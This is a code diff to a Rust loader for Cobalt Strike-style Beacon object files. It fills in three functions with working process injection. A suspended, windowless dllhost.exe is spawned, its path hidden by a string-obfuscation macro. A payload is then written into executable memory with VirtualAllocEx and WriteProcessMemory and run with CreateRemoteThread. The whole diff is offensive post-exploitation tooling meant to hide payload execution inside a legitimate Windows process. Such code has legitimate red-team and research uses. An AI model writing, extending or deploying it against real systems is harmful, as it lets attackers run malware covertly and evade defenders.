@@ -17,7 +17,7 @@ use dinvk::{winapis::NtCurrentProcess, syscall};
 use dinvk::types::OBJECT_ATTRIBUTES;
 use windows_sys::Win32::{
     Security::*,
-    Foundation::{CloseHandle, DuplicateHandle, HANDLE, STATUS_SUCCESS},
+    Foundation::{CloseHandle, DuplicateHandle, HANDLE, STATUS_SUCCESS, FALSE},
     System::{
         Threading::*,
         WindowsProgramming::CLIENT_ID,
@@ -46,6 +46,7 @@ use windows_sys::Win32::{
 };
 
 use const_hashes::murmur3;
+use const_encrypt::obf;
 use crate::error::{CoffeeLdrError, Result};
 
 /// Global output buffer used by Beacon-compatible functions.
@@ -770,31 +771,169 @@ fn beacon_data_ptr(data: *mut Data, size: c_int) -> *mut c_char {
     result
 }
 
-/// Leaving this to be implemented by people needing/wanting it
+/// Injects payload into a temporarily spawned process.
+/// The process should have been created by BeaconSpawnTemporaryProcess.
 fn beacon_inject_temporary_process(
-    _info: *const PROCESS_INFORMATION,
-    _payload: *const c_char,
-    _len: c_int,
-    _offset: c_int,
+    info: *const PROCESS_INFORMATION,
+    payload: *const c_char,
+    len: c_int,
+    offset: c_int,
     _arg: *const c_char,
     _a_len: c_int,
 ) {
-    unimplemented!()
+    if info.is_null() || payload.is_null() || len <= 0 {
+        return;
+    }
+
+    unsafe {
+        let h_process = (*info).hProcess;
+        let h_thread = (*info).hThread;
+
+        if h_process.is_null() || h_thread.is_null() {
+            return;
+        }
+
+        // Allocate memory in target process
+        let remote_addr = VirtualAllocEx(
+            h_process,
+            null_mut(),
+            len as usize,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
+
+        if remote_addr.is_null() {
+            return;
+        }
+
+        // Write payload to target process
+        let mut written = 0usize;
+        let write_result = WriteProcessMemory(
+            h_process,
+            remote_addr,
+            payload as *const c_void,
+            len as usize,
+            &mut written,
+        );
+
+        if write_result == 0 {
+            return;
+        }
+
+        // Calculate entry point with offset
+        let entry_point = (remote_addr as usize + offset as usize) as *mut c_void;
+
+        // Create remote thread to execute the payload
+        let mut thread_id = 0u32;
+        let h_remote_thread = CreateRemoteThread(
+            h_process,
+            null_mut(),
+            0,
+            Some(core::mem::transmute(entry_point)),
+            null_mut(),
+            0,
+            &mut thread_id,
+        );
+
+        if !h_remote_thread.is_null() {
+            CloseHandle(h_remote_thread);
+        }
+    }
 }
 
-/// Leaving this to be implemented by people needing/wanting it
+/// Spawns a temporary process in suspended state for injection.
+/// Returns TRUE on success, FALSE on failure.
 fn beacon_spawn_temporary_process(
-    _x86: i32, 
-    _ignore_token: i32, 
-    _s_info: *mut STARTUPINFOA, 
-    _p_info: *mut PROCESS_INFORMATION
-) {
-    unimplemented!()
+    x86: i32,
+    _ignore_token: i32,
+    s_info: *mut STARTUPINFOA,
+    p_info: *mut PROCESS_INFORMATION,
+) -> i32 {
+    if p_info.is_null() {
+        return FALSE;
+    }
+
+    unsafe {
+        // Initialize STARTUPINFO if not provided
+        let mut local_si: STARTUPINFOA = core::mem::zeroed();
+        let si = if s_info.is_null() {
+            local_si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
+            &mut local_si
+        } else {
+            if (*s_info).cb == 0 {
+                (*s_info).cb = core::mem::size_of::<STARTUPINFOA>() as u32;
+            }
+            &mut *s_info
+        };
+
+        // Zero out PROCESS_INFORMATION
+        ptr::write_bytes(p_info, 0, 1);
+
+        // Create process in suspended state
+        let result = if x86 != 0 {
+            let mut path = obf!("C:\\Windows\\SysWOW64\\dllhost.exe\0");
+            CreateProcessA(
+                path.as_bytes().as_ptr(),
+                null_mut(),
+                null_mut(),
+                null_mut(),
+                FALSE,
+                CREATE_SUSPENDED | CREATE_NO_WINDOW,
+                null_mut(),
+                null_mut(),
+                si,
+                p_info,
+            )
+        } else {
+            let mut path = obf!("C:\\Windows\\System32\\dllhost.exe\0");
+            CreateProcessA(
+                path.as_bytes().as_ptr(),
+                null_mut(),
+                null_mut(),
+                null_mut(),
+                FALSE,
+                CREATE_SUSPENDED | CREATE_NO_WINDOW,
+                null_mut(),
+                null_mut(),
+                si,
+                p_info,
+            )
+        };
+
+        if result != 0 { 1 } else { 0 }
+    }
 }
 
-/// Leaving this to be implemented by people needing/wanting it
-fn beacon_get_spawn_to(_x86: i32, _buffer: *const c_char, _length: c_int) {
-    unimplemented!()
+/// Gets the spawn-to program path.
+/// Copies the path to the provided buffer.
+fn beacon_get_spawn_to(x86: i32, buffer: *mut c_char, length: c_int) {
+    if buffer.is_null() || length <= 0 {
+        return;
+    }
+
+    unsafe {
+        if x86 != 0 {
+            let mut path = obf!("C:\\Windows\\SysWOW64\\dllhost.exe");
+            let spawn_path = path.as_bytes();
+            let copy_len = core::cmp::min(spawn_path.len(), length as usize);
+            ptr::copy_nonoverlapping(spawn_path.as_ptr(), buffer as *mut u8, copy_len);
+            if copy_len < length as usize {
+                *buffer.add(copy_len) = 0;
+            } else {
+                *buffer.add(length as usize - 1) = 0;
+            }
+        } else {
+            let mut path = obf!("C:\\Windows\\System32\\dllhost.exe");
+            let spawn_path = path.as_bytes();
+            let copy_len = core::cmp::min(spawn_path.len(), length as usize);
+            ptr::copy_nonoverlapping(spawn_path.as_ptr(), buffer as *mut u8, copy_len);
+            if copy_len < length as usize {
+                *buffer.add(copy_len) = 0;
+            } else {
+                *buffer.add(length as usize - 1) = 0;
+            }
+        }
+    }
 }
 
 /// Adds a key-value pair to the global store.
